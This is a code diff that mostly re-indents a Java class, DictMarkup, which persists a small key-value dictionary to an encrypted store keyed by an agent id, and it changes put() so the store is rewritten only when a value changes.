@@ -12,131 +12,136 @@ import blackberry.utils.Utils;
 
 public class DictMarkup extends Markup {
 
-        //#ifdef DEBUG
-        static Debug debug = new Debug("DictMarkup", DebugLevel.INFORMATION);
-        //#endif
+    //#ifdef DEBUG
+    static Debug debug = new Debug("DictMarkup", DebugLevel.INFORMATION);
+    //#endif
 
-        private static final int MARKUP_SIZE = 35 * 100;
-        private static final int MAX_DICT_SIZE = 100;
-        Hashtable dictionary = null;
+    private static final int MARKUP_SIZE = 35 * 100;
+    private static final int MAX_DICT_SIZE = 100;
+    Hashtable dictionary = null;
 
-        public DictMarkup(int agentId, byte[] aesKey) {
-            super(agentId, aesKey);
-            initDictMarkup();
+    public DictMarkup(int agentId, byte[] aesKey) {
+        super(agentId, aesKey);
+        initDictMarkup();
+    }
+
+    protected synchronized void initDictMarkup() {
+        dictionary = new Hashtable();
+
+        if (!isMarkup()) {
+            writeMarkup(Utils.intToByteArray(0));
+            return;
         }
 
-        protected synchronized void initDictMarkup() {
-            dictionary = new Hashtable();
+        byte[] plain;
+        try {
+            plain = readMarkup();
 
-            if (!isMarkup()) {
-                writeMarkup(Utils.intToByteArray(0));
-                return;
+            final DataBuffer dataBuffer = new DataBuffer(plain, 0,
+                    plain.length, false);
+
+            final int size = dataBuffer.readInt();
+            for (int i = 0; i < size; i++) {
+                final String key = new String(dataBuffer.readByteArray());
+                final byte[] value = dataBuffer.readByteArray();
+                dictionary.put(key, value);
             }
+        } catch (final IOException e) {
+            //#ifdef DEBUG
+            debug.error("initDictMarkup");
+            removeMarkup();
+            //#endif
+        }
+    }
 
-            byte[] plain;
+    protected synchronized boolean writeMarkup(Hashtable dict) {
+        final byte[] payload = new byte[MARKUP_SIZE];
+        final DataBuffer dataBuffer = new DataBuffer(payload, 0, MARKUP_SIZE,
+                false);
+        final Enumeration enumeration = dict.keys();
+        dataBuffer.writeInt(dict.size());
+
+        while (enumeration.hasMoreElements()) {
             try {
-                plain = readMarkup();
+                final String key = (String) enumeration.nextElement();
+                final byte[] data = (byte[]) dict.get(key);
 
-                final DataBuffer dataBuffer = new DataBuffer(plain, 0,
-                        plain.length, false);
-
-                final int size = dataBuffer.readInt();
-                for (int i = 0; i < size; i++) {
-                    final String key = new String(dataBuffer.readByteArray());
-                    final byte[] value = dataBuffer.readByteArray();
-                    dictionary.put(key, value);
-                }
-            } catch (final IOException e) {
                 //#ifdef DEBUG
-                debug.error("initDictMarkup");
-                removeMarkup();
+                debug.trace("writeMarkup key: " + key + " value: " + data);
                 //#endif
-            }
-        }
-
-        protected synchronized boolean writeMarkup(Hashtable dict) {
-            final byte[] payload = new byte[MARKUP_SIZE];
-            final DataBuffer dataBuffer = new DataBuffer(payload, 0, MARKUP_SIZE,
-                    false);
-            final Enumeration enumeration = dict.keys();
-            dataBuffer.writeInt(dict.size());
-
-            while (enumeration.hasMoreElements()) {
-                try {
-                    final String key = (String) enumeration.nextElement();
-                    final byte[] data = (byte[]) dict.get(key);
-
-                    //#ifdef DEBUG
-                    debug.trace("writeMarkup key: " + key + " value: " + data);
-                    //#endif
-                    dataBuffer.writeByteArray(key.getBytes());
-                    dataBuffer.writeByteArray(data);
-                } catch (final Exception ex) {
-                    //#ifdef DEBUG
-                    debug.error("writeMarkup");
-                    //#endif
-                    return false;
-                }
-            }
-            return writeMarkup(payload);
-
-        }
-
-        public synchronized boolean put(String key, byte[] data) {
-            if (key == null || data == null) {
+                dataBuffer.writeByteArray(key.getBytes());
+                dataBuffer.writeByteArray(data);
+            } catch (final Exception ex) {
                 //#ifdef DEBUG
-                debug.error("key==null || value==null");
+                debug.error("writeMarkup");
                 //#endif
                 return false;
             }
+        }
+        return writeMarkup(payload);
 
-            //#ifdef DBC
-            Check.requires(key != null, "put key null");
-            Check.requires(data != null, "put value null");
+    }
+
+    public synchronized boolean put(String key, byte[] data) {
+        if (key == null || data == null) {
+            //#ifdef DEBUG
+            debug.error("key==null || value==null");
             //#endif
+            return false;
+        }
 
+        //#ifdef DBC
+        Check.requires(key != null, "put key null");
+        Check.requires(data != null, "put value null");
+        //#endif
+
+        Object prev = dictionary.put(key, data);
+        //#ifdef DEBUG
+        debug.info("put key: " + key);
+        //#endif
+
+        if (!data.equals(prev)) {
             if (dictionary.size() > MAX_DICT_SIZE) {
                 shrinkDictionary();
             }
-
-            dictionary.put(key, data);
-            //#ifdef DEBUG
-            debug.info("put key: " + key);
-            //#endif
             return writeMarkup(dictionary);
         }
 
-        private void shrinkDictionary() {
-            if (dictionary.size() > 0) {
-                final Object key = dictionary.keys().nextElement();
-                dictionary.remove(key);
-            }
-        }
+        return true;
 
-        public synchronized byte[] get(String key) {
-            if (dictionary.containsKey(key)) {
-                try {
-                    final byte[] data = (byte[]) dictionary.get(key);
-                    //#ifdef DEBUG
-                    debug.info("get key: " + key + " data: " + data);
-                    //#endif
-                    return data;
-                } catch (final Exception ex) {
-                    //#ifdef DEBUG
-                    debug.error("get");
-                    //#endif
-                    return null;
-                }
+    }
 
-            } else {
-                return null;
-            }
-        }
-
-        public synchronized void removeMarkup() {
-            super.removeMarkup();
-            if (dictionary != null) {
-                dictionary.clear();
-            }
+    private void shrinkDictionary() {
+        if (dictionary.size() > 0) {
+            final Object key = dictionary.keys().nextElement();
+            dictionary.remove(key);
         }
     }
+
+    public synchronized byte[] get(String key) {
+        if (dictionary.containsKey(key)) {
+            try {
+                final byte[] data = (byte[]) dictionary.get(key);
+                //#ifdef DEBUG
+                debug.info("get key: " + key + " data: " + data);
+                //#endif
+                return data;
+            } catch (final Exception ex) {
+                //#ifdef DEBUG
+                debug.error("get");
+                //#endif
+                return null;
+            }
+
+        } else {
+            return null;
+        }
+    }
+
+    public synchronized void removeMarkup() {
+        super.removeMarkup();
+        if (dictionary != null) {
+            dictionary.clear();
+        }
+    }
+}
